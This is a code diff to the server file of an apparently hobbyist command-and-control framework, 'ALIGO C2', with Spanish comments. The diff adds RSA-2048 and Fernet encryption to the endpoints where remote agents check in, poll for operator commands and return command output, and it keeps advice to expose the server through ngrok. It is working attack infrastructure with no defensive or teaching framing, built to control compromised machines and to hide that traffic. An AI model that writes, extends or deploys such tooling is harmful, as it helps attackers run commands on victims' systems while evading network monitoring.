@@ -1,20 +1,25 @@
+# server/server.py
 """
-Servidor C2 - HTTPS Version
+Servidor C2 - HTTPS Version con Cifrado Híbrido
 Acepta conexiones de múltiples agentes vía HTTP/HTTPS, permite al operador
-elegir un agente y mandarle comandos, recibe y muestra resultados.
+elegir un agente y mandarle comandos, recibe y muestra resultados de forma cifrada.
 
 Protocolo: HTTP con JSON (REST API).
-Compatible con ngrok: ngrok http 5000
+Cifrado: RSA-2048 para intercambio de llaves + Fernet (AES-128) para sesión.
 """
 
-from flask import Flask, request, jsonify
-import threading
-import json
-import uuid
 import os
 import sys
+import uuid
 import time
+import json
+import threading
 from datetime import datetime
+from flask import Flask, request, jsonify
+
+# Agregar el directorio raíz a sys.path para poder importar shared/
+sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
+from shared.crypto_utils import C2Crypto
 
 HOST = "0.0.0.0"
 PORT = int(os.getenv("PORT", 5000))  # Puerto configurable vía variable de entorno
@@ -22,7 +27,12 @@ PORT = int(os.getenv("PORT", 5000))  # Puerto configurable vía variable de ento
 app = Flask(__name__)
 app.config['JSON_SORT_KEYS'] = False
 
+# Variables de Criptografía de Servidor (Generadas en el inicio)
+server_private_key = None
+server_public_key = None
+
 # Diccionario de agentes conectados: {agent_id: info}
+# Contiene: {"hostname", "os", "last_seen", "ip", "session_key"}
 agents = {}
 agents_lock = threading.Lock()
 
@@ -37,76 +47,139 @@ results_history = []
 # ENDPOINTS HTTP
 # ============================================
 
+@app.route('/public-key', methods=['GET'])
+def get_public_key():
+    """Entrega la llave pública RSA del servidor en formato PEM para el Handshake."""
+    pem_key = C2Crypto.serialize_public_key(server_public_key)
+    return jsonify({"public_key": pem_key})
+
+
 @app.route('/checkin', methods=['POST'])
 def checkin():
-    """Agente se registra inicialmente."""
+    """Agente se registra inicialmente y envía su llave Fernet cifrada con RSA."""
     data = request.json
+    if not data:
+        return jsonify({"error": "Payload JSON requerido"}), 400
+
     agent_id = data.get('agent_id', str(uuid.uuid4())[:8])
     hostname = data.get('hostname', 'unknown')
     os_type = data.get('os', 'unknown')
-    
-    with agents_lock:
-        agents[agent_id] = {
-            "hostname": hostname,
-            "os": os_type,
-            "last_seen": datetime.now(),
-            "ip": request.remote_addr
-        }
-        if agent_id not in pending_commands:
-            pending_commands[agent_id] = []
-    
-    print(f"\n[+] Agente conectado: {agent_id} desde {request.remote_addr} ({hostname})")
-    print("> ", end="", flush=True)
-    
-    return jsonify({"status": "ok", "agent_id": agent_id})
+    encrypted_session_key = data.get('encrypted_session_key')
+
+    if not encrypted_session_key:
+        return jsonify({"error": "encrypted_session_key es requerido para el registro"}), 400
+
+    try:
+        # Descifrar la llave simétrica (Fernet) generada por el agente usando la llave privada RSA del servidor
+        session_key = C2Crypto.rsa_decrypt(server_private_key, encrypted_session_key)
+        
+        with agents_lock:
+            agents[agent_id] = {
+                "hostname": hostname,
+                "os": os_type,
+                "last_seen": datetime.now(),
+                "ip": request.remote_addr,
+                "session_key": session_key  # Guardamos la llave simétrica de sesión descifrada (bytes)
+            }
+            if agent_id not in pending_commands:
+                pending_commands[agent_id] = []
+        
+        print(f"\n[+] Agente conectado: {agent_id} desde {request.remote_addr} ({hostname}) [Canal Cifrado Establecido]")
+        print("> ", end="", flush=True)
+        
+        return jsonify({"status": "ok", "agent_id": agent_id})
+    except Exception as e:
+        print(f"\n[!] Error decifrando llave de sesión de {agent_id}: {e}")
+        return jsonify({"error": "Fallo en el descifrado de llave de sesión"}), 400
 
 
 @app.route('/poll', methods=['POST'])
 def poll():
-    """Agente pregunta si hay comandos pendientes."""
+    """Agente pregunta si hay comandos pendientes (envía respuesta cifrada)."""
     data = request.json
+    if not data:
+        return jsonify({"error": "Payload JSON requerido"}), 400
+
     agent_id = data.get('agent_id')
-    
     if not agent_id:
         return jsonify({"error": "agent_id requerido"}), 400
     
-    # Actualizar last_seen
+    # Validar que el agente esté registrado
     with agents_lock:
-        if agent_id in agents:
-            agents[agent_id]['last_seen'] = datetime.now()
+        if agent_id not in agents:
+            return jsonify({"error": "Agente no registrado"}), 401
         
-        # Verificar si hay comandos pendientes
+        # Actualizar last_seen
+        agents[agent_id]['last_seen'] = datetime.now()
+        session_key = agents[agent_id]['session_key']
+        
+        # Obtener comando pendiente
+        cmd = None
         if agent_id in pending_commands and pending_commands[agent_id]:
             cmd = pending_commands[agent_id].pop(0)
-            return jsonify(cmd)
-    
-    return jsonify({"command": None})
+
+    # Preparar el paquete a transmitir
+    if cmd:
+        cmd_json = json.dumps(cmd)
+    else:
+        # Si no hay comandos, se responde un objeto nulo de forma estructurada
+        cmd_json = json.dumps({"command": None})
+
+    try:
+        # Cifrar el comando JSON de forma simétrica usando la llave Fernet de este agente específico
+        encrypted_payload = C2Crypto.fernet_encrypt(session_key, cmd_json)
+        return jsonify({"payload": encrypted_payload})
+    except Exception as e:
+        print(f"\n[!] Error cifrando comando para {agent_id}: {e}")
+        return jsonify({"error": "Error interno de cifrado"}), 500
 
 
 @app.route('/result', methods=['POST'])
 def result():
-    """Agente envía el resultado de un comando ejecutado."""
+    """Agente envía el resultado de un comando ejecutado de forma cifrada."""
     data = request.json
+    if not data:
+        return jsonify({"error": "Payload JSON requerido"}), 400
+
     agent_id = data.get('agent_id')
-    msg_id = data.get('id')
-    output = data.get('output', '')
-    status = data.get('status', 'ok')
-    
-    # Guardar en historial (opcional)
-    results_history.append({
-        "agent_id": agent_id,
-        "id": msg_id,
-        "output": output,
-        "status": status,
-        "timestamp": datetime.now()
-    })
-    
-    # Mostrar resultado en consola
-    print(f"\n[resultado de {agent_id}] (id={msg_id}):")
-    print(output)
-    print("> ", end="", flush=True)
-    
-    return jsonify({"status": "ok"})
+    encrypted_payload = data.get('payload')
+
+    if not agent_id or not encrypted_payload:
+        return jsonify({"error": "agent_id y payload requeridos"}), 400
+
+    with agents_lock:
+        if agent_id not in agents:
+            return jsonify({"error": "Agente no registrado"}), 401
+        session_key = agents[agent_id]['session_key']
+
+    try:
+        # Descifrar los resultados utilizando la llave Fernet de la sesión del agente
+        decrypted_bytes = C2Crypto.fernet_decrypt(session_key, encrypted_payload)
+        decrypted_str = decrypted_bytes.decode('utf-8') if isinstance(decrypted_bytes, bytes) else decrypted_bytes
+        result_data = json.loads(decrypted_str)
+
+        msg_id = result_data.get('id')
+        output = result_data.get('output', '')
+        status = result_data.get('status', 'ok')
+        
+        # Guardar en historial
+        results_history.append({
+            "agent_id": agent_id,
+            "id": msg_id,
+            "output": output,
+            "status": status,
+            "timestamp": datetime.now()
+        })
+        
+        # Mostrar resultado descifrado en la consola del operador
+        print(f"\n[resultado de {agent_id}] (id={msg_id}):")
+        print(output)
+        print("> ", end="", flush=True)
+        
+        return jsonify({"status": "ok"})
+    except Exception as e:
+        print(f"\n[!] Error descifrando resultado de {agent_id}: {e}")
+        return jsonify({"error": "Fallo en el descifrado del resultado"}), 400
 
 
 @app.route('/health', methods=['GET'])
@@ -217,9 +290,14 @@ def operator_console():
 # ============================================
 
 def main():
+    global server_private_key, server_public_key
+    
     print("=" * 60)
-    print("  ALIGO C2 - Servidor HTTPS")
+    print("  ALIGO C2 - Servidor HTTPS con Cifrado Híbrido")
     print("=" * 60)
+    print("[*] Generando par de llaves RSA-2048 del servidor...")
+    server_private_key, server_public_key = C2Crypto.generate_rsa_keypair()
+    print("[✓] Llave pública y privada RSA creadas exitosamente")
     print(f"[*] Servidor HTTP escuchando en {HOST}:{PORT}")
     print(f"[*] Usa ngrok con: ngrok http {PORT}")
     print(f"[*] Los logs de Flask se muestran mezclados con la consola")
@@ -241,7 +319,6 @@ def main():
                 for aid in inactive_agents:
                     agents.pop(aid, None)
                     pending_commands.pop(aid, None)
-                    # No imprimir nada para no interrumpir la consola
     
     cleanup_thread = threading.Thread(target=cleanup_inactive_agents, daemon=True)
     cleanup_thread.start()
